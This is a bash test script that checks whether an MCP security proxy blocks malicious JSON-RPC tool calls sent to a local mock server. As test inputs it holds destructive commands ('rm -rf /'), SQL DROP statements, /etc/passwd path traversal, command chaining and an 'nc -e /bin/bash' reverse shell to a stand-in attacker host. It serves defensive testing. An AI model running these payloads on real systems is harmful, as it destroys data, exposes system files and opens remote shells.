#!/bin/bash

# Real-time Blocking Effectiveness Test Script
# This script validates the effectiveness of MCP proxy real-time blocking

set -e

echo "🔒 MCP Security Scanner - Real-Time Blocking Effectiveness Test"
echo "================================================================"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test configuration
PROXY_PORT=8082
TARGET_PORT=8083
TEST_TIMEOUT=30

# macOS compatibility - check port connectivity
check_port() {
    local port=$1
    if command -v nc >/dev/null 2>&1; then
        nc -z localhost $port 2>/dev/null
    else
        # Alternative using bash built-in
        (echo > /dev/tcp/localhost/$port) 2>/dev/null
    fi
}

# macOS compatibility - use gtimeout if available, otherwise implement a basic timeout
if command -v gtimeout >/dev/null 2>&1; then
    TIMEOUT_CMD="gtimeout"
elif command -v timeout >/dev/null 2>&1; then
    TIMEOUT_CMD="timeout"
else
    # Basic timeout implementation for macOS
    timeout_func() {
        local timeout=$1; shift
        "$@" &
        local pid=$!
        ( sleep $timeout; kill $pid 2>/dev/null ) &
        local killer=$!
        wait $pid 2>/dev/null
        local exit_code=$?
        kill $killer 2>/dev/null
        return $exit_code
    }
    TIMEOUT_CMD="timeout_func"
fi

echo "📋 Test Configuration:"
echo "   - Proxy Port: $PROXY_PORT"
echo "   - Target Port: $TARGET_PORT"
echo "   - Test Timeout: ${TEST_TIMEOUT}s"
echo ""

# Function to check if port is in use
check_port() {
    local port=$1
    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null ; then
        echo "Port $port is already in use"
        return 1
    fi
    return 0
}

# Function to wait for service to be ready
wait_for_service() {
    local url=$1
    local timeout=$2
    echo "⏳ Waiting for service at $url (timeout: ${timeout}s)..."
    
    for i in $(seq 1 $timeout); do
        if curl -s "$url" >/dev/null 2>&1; then
            echo "✅ Service is ready"
            return 0
        fi
        sleep 1
    done
    
    echo "❌ Service not ready after ${timeout}s"
    return 1
}

# Function to cleanup background processes
cleanup() {
    echo ""
    echo "🧹 Cleaning up..."
    
    # Kill any background processes we started
    jobs -p | xargs -r kill 2>/dev/null || true
    
    # Kill any processes on our test ports
    lsof -ti:$PROXY_PORT | xargs -r kill 2>/dev/null || true
    lsof -ti:$TARGET_PORT | xargs -r kill 2>/dev/null || true
    
    echo "✅ Cleanup complete"
}

# Set trap for cleanup
trap cleanup EXIT INT TERM

echo "🔍 Checking prerequisites..."

# Check if mcpscan binary exists
if [ ! -f "./mcpscan" ]; then
    echo "❌ mcpscan binary not found. Building..."
    make build
    if [ ! -f "./mcpscan" ]; then
        echo "❌ Failed to build mcpscan"
        exit 1
    fi
fi

# Check if ports are available
if ! check_port $PROXY_PORT; then
    echo "❌ Proxy port $PROXY_PORT is in use"
    exit 1
fi

if ! check_port $TARGET_PORT; then
    echo "❌ Target port $TARGET_PORT is in use"
    exit 1
fi

echo "✅ Prerequisites check passed"
echo ""

# Start mock vulnerable server
echo "🎯 Starting mock vulnerable MCP server on port $TARGET_PORT..."
python3 -c "
import http.server
import socketserver
import json
from urllib.parse import urlparse, parse_qs

class MockMCPHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            request = json.loads(post_data)
            response = {
                'jsonrpc': '2.0',
                'id': request.get('id'),
                'result': {
                    'status': 'executed',
                    'message': 'Command would be executed on vulnerable server',
                    'request': request
                }
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Invalid JSON-RPC')
    
    def log_message(self, format, *args):
        return  # Suppress logging

with socketserver.TCPServer(('', $TARGET_PORT), MockMCPHandler) as httpd:
    httpd.serve_forever()
" &

MOCK_SERVER_PID=$!
sleep 2

# Verify mock server is running
if ! wait_for_service "http://localhost:$TARGET_PORT" 5; then
    echo "❌ Failed to start mock server"
    exit 1
fi

echo "✅ Mock server started (PID: $MOCK_SERVER_PID)"
echo ""

# Start MCP proxy with critical security policy
echo "🛡️  Starting MCP proxy on port $PROXY_PORT..."
./mcpscan proxy "http://localhost:$TARGET_PORT" $PROXY_PORT &
PROXY_PID=$!
sleep 3

# Verify proxy is running - first try health endpoint, then basic connectivity
if ! wait_for_service "http://localhost:$PROXY_PORT/monitor/health" 5; then
    echo "⚠️  Health endpoint not responding, checking basic connectivity..."
    # Simple port check as fallback
    for i in {1..5}; do
        if check_port $PROXY_PORT; then
            echo "✅ Proxy port is open"
            break
        fi
        sleep 1
    done
    
    if ! check_port $PROXY_PORT; then
        echo "❌ Failed to start proxy"
        exit 1
    fi
fi

echo "✅ Proxy started (PID: $PROXY_PID)"
echo ""

# Function to test blocking
test_request() {
    local test_name="$1"
    local request_data="$2"
    local should_block="$3"
    
    echo -n "🧪 Testing: $test_name... "
    
    response=$(curl -s -w "%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$request_data" \
        "http://localhost:$PROXY_PORT" 2>/dev/null || echo "000")
    
    http_code="${response: -3}"
    response_body="${response%???}"
    
    if [ "$should_block" = "true" ]; then
        # Should be blocked
        if [ "$http_code" -ge 400 ] || [[ "$response_body" == *"blocked"* ]] || [[ "$response_body" == *"denied"* ]]; then
            echo -e "${GREEN}BLOCKED ✅${NC} (HTTP $http_code)"
            return 0
        else
            echo -e "${RED}NOT BLOCKED ❌${NC} (HTTP $http_code)"
            return 1
        fi
    else
        # Should be allowed
        if [ "$http_code" -eq 200 ]; then
            echo -e "${GREEN}ALLOWED ✅${NC} (HTTP $http_code)"
            return 0
        else
            echo -e "${RED}INCORRECTLY BLOCKED ❌${NC} (HTTP $http_code)"
            return 1
        fi
    fi
}

echo "🚨 Running Real-Time Blocking Tests..."
echo ""

# Track test results
total_tests=0
passed_tests=0

# Test 1: Destructive Commands (should be blocked)
echo "${YELLOW}=== Destructive Command Tests ===${NC}"
test_cases=(
    "Destructive rm command|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"shell\",\"arguments\":{\"command\":\"rm -rf /\"}},\"id\":\"test1\"}|true"
    "Delete system files|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"exec\",\"arguments\":{\"cmd\":\"rm -rf /etc\"}},\"id\":\"test2\"}|true"
    "Format filesystem|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"system\",\"arguments\":{\"command\":\"sudo rm -rf /*\"}},\"id\":\"test3\"}|true"
)

for test_case in "${test_cases[@]}"; do
    IFS='|' read -r name request should_block <<< "$test_case"
    total_tests=$((total_tests + 1))
    if test_request "$name" "$request" "$should_block"; then
        passed_tests=$((passed_tests + 1))
    fi
done

echo ""

# Test 2: SQL Injection (should be blocked)
echo "${YELLOW}=== SQL Injection Tests ===${NC}"
test_cases=(
    "DROP TABLE attack|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"query\",\"arguments\":{\"sql\":\"DROP TABLE users\"}},\"id\":\"test4\"}|true"
    "DROP DATABASE attack|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"db_query\",\"arguments\":{\"query\":\"DROP DATABASE production\"}},\"id\":\"test5\"}|true"
)

for test_case in "${test_cases[@]}"; do
    IFS='|' read -r name request should_block <<< "$test_case"
    total_tests=$((total_tests + 1))
    if test_request "$name" "$request" "$should_block"; then
        passed_tests=$((passed_tests + 1))
    fi
done

echo ""

# Test 3: Path Traversal (should be blocked)
echo "${YELLOW}=== Path Traversal Tests ===${NC}"
test_cases=(
    "Access /etc/passwd|{\"jsonrpc\":\"2.0\",\"method\":\"resources/read\",\"params\":{\"uri\":\"/etc/passwd\"},\"id\":\"test6\"}|true"
    "Directory traversal|{\"jsonrpc\":\"2.0\",\"method\":\"resources/read\",\"params\":{\"uri\":\"../../../etc/passwd\"},\"id\":\"test7\"}|true"
)

for test_case in "${test_cases[@]}"; do
    IFS='|' read -r name request should_block <<< "$test_case"
    total_tests=$((total_tests + 1))
    if test_request "$name" "$request" "$should_block"; then
        passed_tests=$((passed_tests + 1))
    fi
done

echo ""

# Test 4: Command Injection (should be blocked)
echo "${YELLOW}=== Command Injection Tests ===${NC}"
test_cases=(
    "Command chaining|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"ping\",\"arguments\":{\"host\":\"127.0.0.1; cat /etc/passwd\"}},\"id\":\"test8\"}|true"
    "Reverse shell|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"network\",\"arguments\":{\"cmd\":\"nc -e /bin/bash attacker.com 4444\"}},\"id\":\"test9\"}|true"
)

for test_case in "${test_cases[@]}"; do
    IFS='|' read -r name request should_block <<< "$test_case"
    total_tests=$((total_tests + 1))
    if test_request "$name" "$request" "$should_block"; then
        passed_tests=$((passed_tests + 1))
    fi
done

echo ""

# Test 5: Legitimate Requests (should be allowed)
echo "${YELLOW}=== Legitimate Request Tests ===${NC}"
test_cases=(
    "List tools|{\"jsonrpc\":\"2.0\",\"method\":\"tools/list\",\"id\":\"test10\"}|false"
    "Calculator tool|{\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"name\":\"calculator\",\"arguments\":{\"operation\":\"add\",\"a\":2,\"b\":3}},\"id\":\"test11\"}|false"
    "Read safe resource|{\"jsonrpc\":\"2.0\",\"method\":\"resources/read\",\"params\":{\"uri\":\"memory://workspace/document.txt\"},\"id\":\"test12\"}|false"
)

for test_case in "${test_cases[@]}"; do
    IFS='|' read -r name request should_block <<< "$test_case"
    total_tests=$((total_tests + 1))
    if test_request "$name" "$request" "$should_block"; then
        passed_tests=$((passed_tests + 1))
    fi
done

echo ""

# Performance test
echo "${YELLOW}=== Performance Test ===${NC}"
echo "🚀 Testing blocking performance with rapid requests..."

start_time=$(date +%s.%N)
performance_passed=0
performance_total=20

for i in $(seq 1 $performance_total); do
    if [ $((i % 2)) -eq 0 ]; then
        # Malicious request
        test_request "Perf test $i (malicious)" '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell","arguments":{"command":"rm -rf /"}},"id":"perf'$i'"}' "true" >/dev/null
    else
        # Legitimate request
        test_request "Perf test $i (legitimate)" '{"jsonrpc":"2.0","method":"tools/list","id":"perf'$i'"}' "false" >/dev/null
    fi
    
    if [ $? -eq 0 ]; then
        performance_passed=$((performance_passed + 1))
    fi
done

end_time=$(date +%s.%N)
duration=$(echo "$end_time - $start_time" | bc)
avg_latency=$(echo "scale=3; $duration / $performance_total" | bc)
rps=$(echo "scale=2; $performance_total / $duration" | bc)

echo "📊 Performance Results:"
echo "   - Total requests: $performance_total"
echo "   - Duration: ${duration}s"
echo "   - Average latency: ${avg_latency}s"
echo "   - Requests per second: $rps"
echo "   - Performance tests passed: $performance_passed/$performance_total"

# Add performance tests to overall results
total_tests=$((total_tests + performance_total))
passed_tests=$((passed_tests + performance_passed))

echo ""

# Final results
echo "📈 Final Test Results"
echo "===================="
success_rate=$(echo "scale=2; $passed_tests * 100 / $total_tests" | bc)

echo "Total Tests: $total_tests"
echo "Tests Passed: $passed_tests"
echo "Tests Failed: $((total_tests - passed_tests))"
echo "Success Rate: ${success_rate}%"

echo ""

if [ $passed_tests -eq $total_tests ]; then
    echo -e "${GREEN}🎉 ALL TESTS PASSED! Real-time blocking is working effectively.${NC}"
    exit 0
elif (( $(echo "$success_rate >= 90" | bc -l) )); then
    echo -e "${YELLOW}⚠️  Most tests passed ($success_rate%), but some issues detected.${NC}"
    exit 1
else
    echo -e "${RED}❌ Significant blocking failures detected ($success_rate% success rate).${NC}"
    exit 1
fi
